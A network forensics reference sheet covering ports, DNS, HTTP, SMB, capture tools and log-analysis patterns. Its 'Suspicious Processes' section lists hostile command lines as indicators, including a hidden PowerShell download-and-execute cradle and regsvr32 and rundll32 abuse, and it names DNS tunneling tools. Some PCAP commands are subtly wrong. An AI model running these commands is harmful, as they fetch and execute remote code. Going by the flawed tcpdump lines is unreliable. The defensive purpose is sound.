# Network Protocols Reference

## TCP/IP Model

### Layers
1. **Physical** - Hardware, cables
2. **Data Link** - MAC addresses, Ethernet, ARP
3. **Network** - IP, ICMP, Routing
4. **Transport** - TCP, UDP
5. **Application** - HTTP, DNS, FTP, SMTP, etc.

## Common Ports

| Port | Service | Protocol |
|------|---------|----------|
| 20/21 | FTP | TCP |
| 22 | SSH | TCP |
| 23 | Telnet | TCP |
| 25 | SMTP | TCP |
| 53 | DNS | UDP/TCP |
| 67/68 | DHCP | UDP |
| 80 | HTTP | TCP |
| 110 | POP3 | TCP |
| 123 | NTP | UDP |
| 135 | RPC | TCP |
| 137-139 | NetBIOS | TCP/UDP |
| 143 | IMAP | TCP |
| 161/162 | SNMP | UDP |
| 389 | LDAP | TCP/UDP |
| 443 | HTTPS | TCP |
| 445 | SMB | TCP |
| 465 | SMTPS | TCP |
| 514 | Syslog | UDP |
| 587 | SMTP submission | TCP |
| 636 | LDAPS | TCP |
| 993 | IMAPS | TCP |
| 995 | POP3S | TCP |
| 1433 | MSSQL | TCP |
| 3306 | MySQL | TCP |
| 3389 | RDP | TCP |
| 5432 | PostgreSQL | TCP |
| 5900 | VNC | TCP |
| 6379 | Redis | TCP |
| 8080 | HTTP Alt | TCP |
| 8443 | HTTPS Alt | TCP |
| 27017 | MongoDB | TCP |

## DNS

### DNS Record Types
- **A** - IPv4 address
- **AAAA** - IPv6 address
- **CNAME** - Canonical name (alias)
- **MX** - Mail exchange
- **NS** - Name server
- **SOA** - Start of Authority
- **TXT** - Text records
- **PTR** - Pointer (reverse DNS)
- **SRV** - Service location
- **DNSKEY** - DNS key
- **NSEC** - Next secure

### DNS Query Flow
```
Client -> Recursive Resolver -> Root Server -> TLD Server -> Authoritative Server
```

## HTTP/HTTPS

### HTTP Methods
| Method | Description | Idempotent |
|--------|-------------|------------|
| GET | Retrieve resource | Yes |
| POST | Submit data | No |
| PUT | Replace resource | Yes |
| DELETE | Remove resource | Yes |
| PATCH | Partial update | No |
| HEAD | Headers only | Yes |
| OPTIONS | Capabilities | Yes |

### HTTP Status Codes
| Code | Meaning |
|------|---------|
| 1xx | Informational |
| 200 | OK |
| 201 | Created |
| 204 | No Content |
| 301 | Moved Permanently |
| 302 | Found |
| 304 | Not Modified |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 405 | Method Not Allowed |
| 500 | Internal Server Error |
| 502 | Bad Gateway |
| 503 | Service Unavailable |

### Common HTTP Headers
```
Request:
Host, User-Agent, Accept, Accept-Language, Accept-Encoding, Connection, Authorization, Cookie, Referer

Response:
Content-Type, Content-Length, Content-Encoding, Set-Cookie, Server, Location, WWW-Authenticate, Cache-Control
```

## SMB/CIFS

### SMB Versions
- SMB 1.0 (Windows 2000)
- SMB 2.0 (Vista/Server 2008)
- SMB 2.1 (Win7/Server 2008R2)
- SMB 3.0 (Win8/Server 2012)
- SMB 3.1.1 (Win10/Server 2016)

### SMB Commands
```
0x00 - SMB2_COM_CREATE
0x01 - SMB2_COM_CLOSE
0x02 - SMB2_COM_READ
0x03 - SMB2_COM_WRITE
0x05 - SMB2_COM_DELETE
0x06 - SMB2_COM_RENAME
0x08 - SMB2_COM_SET_INFORMATION
0x09 - SMB2_COM_SET_EA
0x0A - SMB2_COM_SET_INFO2
0x0B - SMB2_COM_LOCK
0x0C - SMB2_COM_IOCTL
```

### SMB Artifacts
- \\server\share
- NTUSER.DAT (registry)
- Jump Lists
- Recent files

## Network Forensics Tools

### Packet Capture
- **tcpdump** - Command-line packet analyzer
- **Wireshark** - GUI packet analyzer
- **tshark** - Terminal Wireshark
- **netsniff-ng** - Fast packet capture

### Traffic Analysis
- **Zeek** - Network security monitor
- **Suricata** - IDS/IPS
- **Snort** - IDS/IPS
- **Bro** (now Zeek)

### PCAP Analysis Commands
```bash
# Extract HTTP requests
tcpdump -r capture.pcap -w output.pcap 'tcp port 80'

# Extract images from PCAP
foremost -i capture.pcap -o carved

# Reassemble TCP streams
tcpdump -r capture.pcap -w streams.pcap -z

# Extract DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name
```

## Common Attack Patterns

### DNS Exfiltration
```
- Long subdomains
- Base64 encoded data
- Random subdomain generation
- DNS tunneling (iodine, dnscat2)
```

### HTTP-Based Exfiltration
```
- POST to unusual endpoints
- Large Cookie values
- Custom headers
- Steganography in images
```

### Encrypted Traffic
```
- Unusual ciphers
- Certificate pinning bypass
- TLS version downgrade
- Malformed TLS ClientHello
```

## Log Analysis Patterns

### Failed Login (SSH)
```
grep "Failed password" /var/log/auth.log
grep "authentication failure" /var/log/syslog
```

### Suspicious Processes
```
# Lateral movement
regsvr32 /s /u /i:scrobj.dll
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('xss'); 
 powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://...'))"
```

### Data Exfiltration
```
# Large outbound files
netstat -ant | grep :80 | grep ESTABLISHED
# Unusual ports
ss -tan | grep ESTAB | awk '{print $4}' | sort | uniq -c | sort -rn
```
